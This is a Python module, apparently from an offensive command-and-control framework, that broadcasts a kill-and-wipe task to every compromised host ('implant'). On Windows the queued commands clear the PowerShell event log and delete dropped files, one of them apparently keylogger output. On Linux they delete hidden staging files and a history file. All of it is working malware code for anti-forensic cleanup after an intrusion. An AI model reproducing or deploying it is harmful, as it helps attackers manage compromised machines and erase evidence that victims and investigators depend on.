"""quantum.postexploit.killswitch — KILLSWITCH + TASKQ + kill broadcast."""
from __future__ import annotations

import os

from quantum.core.logging import log

TASKQ: dict = {}          # per-implant task queues (host -> task dict)
KILLSWITCH = {"on": False}   # global; toggled via POST /kill on the C2


def kill_all_implants(wipe_first=True):
    """Broadcast auto-cleanup termination to every beaconing implant."""
    global TASKQ
    for host in list(TASKQ.keys()):
        if wipe_first:
            TASKQ[host] = {"act": "run",
                           "cmd": ("powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell';"
                                   " Remove-Item $env:TEMP\\a.bat,$env:TEMP\\kl.klq -ErrorAction SilentlyContinue\"")
                           if os.name == "nt" else
                           "rm -f /var/tmp/.gn-* ~/.bash_history.tmp; kill $$ || true"}
        else:
            TASKQ[host] = {"act": "none"}
    KILLSWITCH["on"] = True
    log(f"KILLSWITCH engaged: {len(TASKQ)} implant task queues set to wipe/die", "OPSEC")
    return {"killed": list(TASKQ.keys())}
